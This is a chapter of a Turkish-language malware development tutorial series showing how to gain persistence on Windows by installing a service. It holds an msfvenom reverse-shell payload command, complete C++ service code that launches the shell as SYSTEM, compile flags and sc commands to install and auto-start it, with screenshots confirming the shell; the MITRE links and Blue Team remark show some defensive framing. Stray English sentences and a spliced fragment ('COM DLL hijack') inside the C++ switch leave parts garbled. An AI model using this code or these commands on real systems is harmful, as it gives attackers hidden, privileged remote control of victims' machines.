\newpage
\subsection{70. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 4. Windows Hizmetleri.
Basit C++ örneği.}

![pers](./images/54/2022-05-10_18-10_1.png){width="80%"}    

Bu bölüm, Windows kötü amaçlı yazılım kalıcılık teknikleri ve yöntemleri üzerine yazı dizisinin bir sonraki bölümüdür.    

Bugün, kendi araştırmalarım sonucunda keşfettiğim bir başka kalıcılık yöntemini ele alacağım: Windows Hizmetleri (Windows Services).    

### windows hizmetleri (windows services)
Windows Hizmetleri, aşağıdaki nedenlerden dolayı saldırılar için önemlidir:    
- Ağ üzerinden doğal olarak çalışırlar - tüm Hizmetler API’si uzak sunucular düşünülerek oluşturulmuştur.    
- Sistem açıldığında otomatik olarak başlarlar.    
- İşletim sisteminde son derece yüksek ayrıcalıklara sahip olabilirler.    

Hizmetleri yönetmek yüksek ayrıcalıklar gerektirir ve ayrıcalıksız bir kullanıcı genellikle yalnızca ayarları görüntüleyebilir. Bu durum yirmi yılı aşkın süredir değişmemiştir.      

Windows bağlamında, yanlış yapılandırılmış hizmetler ayrıcalık yükseltmeye yol açabilir veya bir kalıcılık yöntemi olarak kullanılabilir.    
Bu nedenle, yeni bir hizmet oluşturmak Yönetici kimlik bilgileri gerektirir ve gizli bir kalıcılık yöntemi değildir.    

### pratik örnek

Pratik bir örnek ele alalım: bizim için ters bağlantı kabuğu (reverse shell) alacak bir Windows hizmeti nasıl oluşturulur ve çalıştırılır?    

Öncelikle, saldırgan makinemde `msfvenom` kullanarak ters kabuk çalıştırılabilir dosyasını oluşturuyorum `meow.exe`:    

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
```

![pers](./images/54/2022-05-09_16-53.png){width="80%"}    

![pers](./images/54/2022-05-10_17-17.png){width="80%"}    

Ardından, hedef makinede meow.exe çalıştıracak bir hizmet oluşturun.

Bir hizmetin minimum gereksinimleri şunlardır:     
- Ana giriş noktası (Main Entry Point, herhangi bir uygulamada olduğu gibi)    
- Hizmet giriş noktası (Service Entry Point)   
- Hizmet kontrol işleyicisi (Service Control Handler)   

In the main entry point, you rapidly invoke `StartServiceCtrlDispatcher` so the `SCM` may call your Service Entry point (`ServiceMain`):

Ana giriş noktasında, `StartServiceCtrlDispatcher` işlevini hızlıca çağırarak `SCM`'nin hizmet giriş noktanızı (`ServiceMain`) çağırmasını sağlarsınız:       

```cpp
int main() {
  SERVICE_TABLE_ENTRY ServiceTable[] = {
    {"MeowService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
    {NULL, NULL}
  };

  StartServiceCtrlDispatcher(ServiceTable);
  return 0;
}
```

Hizmet Ana Giriş Noktası (Service Main Entry Point) aşağıdaki görevleri yerine getirir:    
- Ana Giriş Noktası'ndan ertelenen gerekli şeyleri başlatın.   
- Hizmet kontrol işleyicisini (`ControlHandler`) kaydedin; bu, Hizmeti Durdur (Service Stop), Duraklat (Pause), Devam Ettir (Continue) vb. kontrol komutlarını işleyecektir.    
- Bunlar, `SERVICE STATUS` yapısının `dwControlsAccepted` alanı aracılığıyla bir bit maskesi olarak kaydedilir.    
- Hizmet durumunu `SERVICE RUNNING` olarak ayarlayın.    
- threads/events/mutex/IPCs vb. oluşturma gibi başlatma prosedürlerini gerçekleştirin.   

```cpp
void ServiceMain(int argc, char** argv) {
  serviceStatus.dwServiceType        = SERVICE_WIN32;
  serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
  serviceStatus.dwControlsAccepted   = 
  SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  serviceStatus.dwWin32ExitCode      = 0;
  serviceStatus.dwServiceSpecificExitCode = 0;
  serviceStatus.dwCheckPoint         = 0;
  serviceStatus.dwWaitHint           = 0;

  hStatus = RegisterServiceCtrlHandler("MeowService", 
  (LPHANDLER_FUNCTION)ControlHandler);
  RunMeow();

  serviceStatus.dwCurrentState = SERVICE_RUNNING;
  SetServiceStatus (hStatus, &serviceStatus);

  while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
    Sleep(SLEEP_TIME);
  }
  return;
}
```

Hizmet Kontrol İşleyicisi (Service Control Handler), Hizmet Ana Giriş Noktası'nda (Service Main Entry Point) kaydedildi. Her hizmetin, SCM'den gelen kontrol isteklerini işlemek için bir işleyiciye sahip olması gerekir:    

```cpp
void ControlHandler(DWORD request) {
  switch(request) {
    case SERVICE_CONTROL_STOP:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;

    case SERVICE_CONTROL_SHUTDOWN:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;

    default:
      break;COM DLL hijack
  }
  SetServiceStatus(hStatus,  &serviceStatus);
  return;
}
```

Yalnızca `SERVICE_CONTROL_STOP` ve `SERVICE_CONTROL_SHUTDOWN` isteklerini uyguladım ve destekledim. `SERVICE_CONTROL_CONTINUE`, `SERVICE_CONTROL_INTERROGATE`, `SERVICE_CONTROL_PAUSE`, `SERVICE_CONTROL_SHUTDOWN` ve diğerleri gibi istekleri de işleyebilirsiniz.     

Ayrıca, kötü amaçlı mantık içeren bir fonksiyon oluşturun:    

```cpp
// run process meow.exe - reverse shell
int RunMeow() {
  void * lb;
  BOOL rv;
  HANDLE th;

  // for example: 
  // msfvenom -p windows/x64/shell_reverse_tcp 
  // LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
  char cmd[] = "Z:\\2022-05-09-malware-pers-4\\meow.exe";
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));
  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, 
  NULL, &si, &pi);
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  return 0;
}

int main() {
  SERVICE_TABLE_ENTRY ServiceTable[] = {
    {"MeowService", 
    (LPSERVICE_MAIN_FUNCTION) ServiceMain},
    {NULL, NULL}
  };

  StartServiceCtrlDispatcher(ServiceTable);
  return 0;
}
```

Daha önce yazdığım gibi, sadece ters kabuk sürecimizi (`meow.exe`) oluşturun:    

![service](./images/54/2022-05-10_18-34.png){width="80%"}    

Elbette, bu kod bir referans değil ve daha çok *"kirli"* bir Kavramsal Kanıt (Proof of Concept) niteliğindedir.    

### demo

Hadi her şeyi adım adım gösterelim.    

Servisimizi derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 meowsrv.cpp -o meowsrv.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![service](./images/54/2022-05-10_17-18.png){width="80%"}    

Hedef makinede (`Windows 10 x64`) hizmeti komut satırından aşağıdaki komutu çalıştırarak yükleyebiliriz. Unutmayın, tüm komutlar yönetici olarak çalıştırılmalıdır:    

```powershell
sc create MeowService binpath= \
"Z:\2022-05-09-malware-pers-4\meowsrv.exe" \
start= auto
```

![service](./images/54/2022-05-10_18-03.png){width="80%"}    

Control et:    

```powershell
sc query MeowService
```

![service](./images/54/2022-05-10_18-04.png){width="80%"}    

Eğer `Process Hacker`'ı açarsak, Hizmetler (`Services`) sekmesinde bunu görebiliriz:   

![service](./images/54/2022-05-10_18-00_1.png){width="80%"}    

Eğer özelliklerini kontrol edersek:    

![service](./images/54/2022-05-10_18-04_1.png){width="80%"}    

`LocalSystem` hesabı, hizmet kontrol yöneticisi tarafından kullanılan önceden tanımlanmış bir yerel hesaptır. Yerel bilgisayar üzerinde geniş ayrıcalıklara sahiptir ve ağ üzerinde bilgisayar olarak hareket eder. Belirteci (token) `NT AUTHORITY\SYSTEM` ve `BUILTIN\Administrators` SID'lerini içerir; bu hesaplar çoğu sistem nesnesine erişim sağlar. Hesabın adı tüm yerel ayarlarda . `\LocalSystem` olarak geçer. Ayrıca `LocalSystem` veya `ComputerName\LocalSystem` adı da kullanılabilir. Bu hesabın bir parolası yoktur. Eğer `CreateService` veya `ChangeServiceConfig` fonksiyonlarını çağırırken `LocalSystem` hesabını belirtirseniz, sağladığınız parola bilgisi [MSDN](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) tarafından göz ardı edilir.    

Daha sonra, aşağıdaki komutla hizmeti başlatın:    

```powershell
sc start MeowService
```

![service](./images/54/2022-05-10_18-04_2.png){width="80%"}    

Ve gördüğünüz gibi, ters kabuğu (reverse shell) aldık!:    

![service](./images/54/2022-05-10_18-06.png){width="80%"}    

`MeowService` hizmetimiz `PID: 5668` aldı:    

![service](./images/54/2022-05-10_18-06_1.png){width="80%"}    

Daha sonra `Process Hacker`'ı yönetici olmayan bir kullanıcı olarak çalıştırın:
   
![service](./images/54/2022-05-10_18-07.png){width="80%"}    

Gördüğünüz gibi, kullanıcı adını göstermiyor. Ancak, `Process Hacker`'ı Yönetici olarak çalıştırmak durumu değiştiriyor ve ters kabuğun `NT AUTHORITY\SYSTEM` hesabı adına çalıştığını görebiliyoruz:    

![service](./images/54/2022-05-10_18-08.png){width="80%"}    

Bunu Ağ (`Network`) sekmesinde de göreceğiz:     

![service](./images/54/2022-05-10_18-09.png){width="80%"}    

Her şey mükemmel çalıştı :)    

Şimdi deneyler tamamlandıktan sonra temizleme işlemlerini yapalım. Hizmeti durdurun:   

```powershell
sc stop MeowService
```

![service](./images/54/2022-05-10_18-12.png){width="80%"}        

So, `MeowService` successfully stopped. And if we delete it:    

Yani, `MeowService` başarıyla durduruldu. Ve eğer onu silersek:    

```powershell
sc delete MeowService
```

![service](./images/54/2022-05-10_18-13.png){width="80%"}    

`Process Hacker`'ın bu işlemle ilgili bildirimini görebiliriz.   

Ancak burada **çok önemli bir nokta var**. Muhtemelen neden doğrudan şu komutu çalıştırmadığımızı merak ediyorsunuz:    

```powershell
sc create MeowService \
binpath= "Z:\2022-05-09-pers-4\meow.exe" \
start= auto
```

Çünkü `meow.exe` aslında bir hizmet (service) değildir. Daha önce belirttiğim gibi, bir hizmetin minimum gereksinimleri belirli fonksiyonları içermelidir: main entry point, service entry point ve service control handler. Eğer sadece `meow.exe` üzerinden bir hizmet oluşturmaya çalışırsanız, işlem hata vererek sonlanacaktır.    

### sonuç

Bu teknik yeni değil, ancak özellikle giriş seviyesindeki Blue Team uzmanlarının dikkatini çekmeye değer. Tehdit aktörleri, yeni hizmetler oluşturmak yerine mevcut Windows hizmetlerini de değiştirebilirler. Bu yöntem, [APT 38](https://attack.mitre.org/groups/G0082/), [APT 32](https://attack.mitre.org/groups/G0050/) ve [APT 41](https://attack.mitre.org/groups/G0096/) gibi gruplar tarafından sıklıkla kullanılmıştır.    

[MITTRE ATT&CK. Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)   
[APT 32](https://attack.mitre.org/groups/G0050/)    
[APT 38](https://attack.mitre.org/groups/G0082/)    
[APT 41](https://attack.mitre.org/groups/G0096/)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-05-09-malware-pers-4)    
